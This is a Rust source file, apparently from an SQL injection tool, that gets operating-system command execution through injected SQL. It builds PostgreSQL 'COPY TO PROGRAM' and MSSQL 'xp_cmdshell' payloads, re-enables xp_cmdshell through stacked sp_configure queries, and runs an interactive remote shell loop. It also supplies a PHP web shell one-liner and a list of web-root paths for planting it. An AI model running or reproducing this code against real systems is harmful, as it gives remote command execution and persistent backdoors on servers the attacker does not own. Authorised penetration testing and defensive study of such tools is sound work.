//! OS command execution through SQL injection

use crate::http::client::HttpClient;
use crate::sqli::core::DBMS;
use crate::sqli::techniques::union::{UnionVector, union_use};
use crate::sqli::request::Request;
use anyhow::Result;
use std::io::{self, Write};
use url::Url;

/// OS shell through SQL injection
pub struct OsShell<'a> {
    client: &'a HttpClient,
    url: Url,
    parameter: String,
    vector: UnionVector,
}

impl<'a> OsShell<'a> {
    pub fn new(client: &'a HttpClient, url: Url, parameter: String, vector: UnionVector) -> Self {
        Self {
            client,
            url,
            parameter,
            vector,
        }
    }

    /// Execute a single OS command
    pub async fn execute_command(&self, command: &str) -> Result<Option<String>> {
        let request = Request::new(self.client, self.url.clone(), self.parameter.clone());
        
        let query = match self.vector.dbms {
            DBMS::MySQL => {
                // MySQL doesn't have native OS command execution
                // Need to use UDF or write a web shell
                return Err(anyhow::anyhow!(
                    "MySQL requires UDF injection for OS commands. Use --file-write to upload a web shell instead."
                ));
            }
            DBMS::PostgreSQL => {
                // PostgreSQL COPY TO PROGRAM (requires superuser)
                format!(
                    "COPY (SELECT '') TO PROGRAM '{}'",
                    command.replace('\'', "''")
                )
            }
            DBMS::MSSQL => {
                // MSSQL xp_cmdshell
                format!(
                    "EXEC master..xp_cmdshell '{}'",
                    command.replace('\'', "''")
                )
            }
            DBMS::Oracle => {
                // Oracle Java stored procedure (if available)
                return Err(anyhow::anyhow!(
                    "Oracle OS command execution requires Java stored procedures"
                ));
            }
            _ => {
                return Err(anyhow::anyhow!("OS command execution not supported for this DBMS"));
            }
        };

        let results = union_use(&request, &self.vector, &query).await?;
        
        if results.is_empty() {
            Ok(None)
        } else {
            Ok(Some(results.join("\n")))
        }
    }

    /// Run interactive OS shell
    pub async fn run(&self) -> Result<()> {
        println!("\n[*] Starting OS shell...");
        println!("[*] DBMS: {}", self.vector.dbms);
        
        match self.vector.dbms {
            DBMS::MSSQL => {
                println!("[*] Using xp_cmdshell for command execution");
            }
            DBMS::PostgreSQL => {
                println!("[*] Using COPY TO PROGRAM for command execution");
                println!("[!] Warning: Requires superuser privileges");
            }
            _ => {
                println!("[!] OS shell not fully supported for {}", self.vector.dbms);
                println!("[*] Consider using --file-write to upload a web shell");
                return Ok(());
            }
        }
        
        println!("[*] Type 'exit' to leave\n");

        loop {
            print!("os-shell> ");
            io::stdout().flush()?;

            let mut input = String::new();
            io::stdin().read_line(&mut input)?;
            let input = input.trim();

            if input.is_empty() {
                continue;
            }

            if input.to_lowercase() == "exit" || input.to_lowercase() == "quit" {
                println!("[*] Exiting OS shell...");
                break;
            }

            match self.execute_command(input).await {
                Ok(Some(output)) => {
                    println!("{}", output);
                }
                Ok(None) => {
                    println!("[*] Command executed (no output)");
                }
                Err(e) => {
                    println!("[!] Error: {}", e);
                }
            }
            println!();
        }

        Ok(())
    }

    /// Enable xp_cmdshell on MSSQL (if disabled)
    pub async fn enable_xp_cmdshell(&self) -> Result<bool> {
        if self.vector.dbms != DBMS::MSSQL {
            return Err(anyhow::anyhow!("xp_cmdshell is MSSQL specific"));
        }

        let request = Request::new(self.client, self.url.clone(), self.parameter.clone());
        
        // Enable xp_cmdshell
        let queries = [
            "EXEC sp_configure 'show advanced options', 1; RECONFIGURE",
            "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE",
        ];

        for query in queries {
            let _ = union_use(&request, &self.vector, &format!("SELECT 1; {}", query)).await;
        }

        Ok(true)
    }
}

/// Web shell generator for MySQL
pub fn generate_php_shell() -> &'static str {
    r#"<?php if(isset($_REQUEST['c'])){system($_REQUEST['c']);} ?>"#
}

/// Generate a simple web shell path
pub fn common_webshell_paths() -> Vec<&'static str> {
    vec![
        "/var/www/html/shell.php",
        "/var/www/shell.php",
        "C:\\inetpub\\wwwroot\\shell.aspx",
        "C:\\xampp\\htdocs\\shell.php",
        "C:\\wamp\\www\\shell.php",
    ]
}
